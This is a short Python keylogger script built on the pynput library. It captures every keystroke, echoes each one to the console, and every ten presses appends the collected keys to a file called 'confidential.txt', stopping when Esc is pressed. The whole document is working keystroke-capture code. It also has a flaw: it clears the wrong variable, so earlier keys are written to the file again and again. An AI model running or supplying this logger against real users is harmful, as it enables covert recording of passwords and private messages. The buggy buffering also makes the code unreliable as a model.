from pynput.keyboard import Key, Listener
count=0
keys=[]
def on_press(key):
    global keys,count
    keys.append(str(key))
    count+=1
    print("And the key are:",format(key))

    if count>=10:
        count=0
        write_file(keys)
        key=[]
def write_file(keys):
    with open("confidential.txt","a") as f:
        for key in keys:
            f.write(key)
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()

